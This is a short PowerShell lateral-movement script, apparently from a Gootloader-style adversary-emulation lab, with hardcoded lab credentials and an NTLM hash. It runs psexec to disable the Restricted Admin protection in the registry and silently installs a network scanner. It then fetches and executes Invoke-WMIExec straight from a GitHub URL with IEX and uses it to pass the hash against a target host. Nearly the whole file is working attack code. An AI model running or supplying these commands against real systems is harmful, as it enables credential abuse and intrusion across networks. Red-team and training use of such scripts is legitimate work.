<#
STEP: Lateral Movement
*** You can assume that the credentials here were gathered from the Discovery and Credential Harvesting techniques used on the previous parts of this exercise***
#>

#Change variable value according to your machine info
$computer = 'angel-3333'  #use hostname to know value
$user = 'studentadmin'   #use whoami to know value "domain/user"
$password = 'N0virus1'
$target = '192.168.1.11'
$domain = 'DEMOLAB'
$hash = '42647ffdedb7aa356da3a78b982bd4c0' #NTLM Hash

cmd /c "cd C:\\Tools\\Gootloader && start psexec.exe \\$computer -u $domain\$user -p $password reg add 'hklm\system\currentcontrolset\control\lsa' /f /v DisableRestrictedAdmin /t REG_DWORD /d 0"

Start-BitsTransfer -Source https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe -Destination C:\\Tools\\GootLoader\\Advanced_IP_Scanner_2.5.4594.1.exe

cmd /c "cd C:\\Tools\\GootLoader && start Advanced_IP_Scanner_2.5.4594.1.exe /VERYSILENT /NORESTART"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1"); 
#Import-Module C:\Users\$user\Invoke-WMIExec.ps1;
Invoke-WMIExec -Target $target -Domain $domain -Username $user -Hash $hash -Command "powershell.exe New-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD" -verbose